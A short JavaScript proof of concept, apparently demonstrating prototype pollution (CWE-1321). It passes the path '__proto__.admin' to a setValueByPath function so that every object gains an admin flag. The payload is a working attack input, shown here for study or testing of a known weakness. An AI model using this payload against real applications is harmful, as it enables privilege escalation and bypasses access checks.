import * as p from './cwe1321.js';

console.log({}.admin);
p.setValueByPath({},"__proto__.admin",true);
console.log({}.admin);
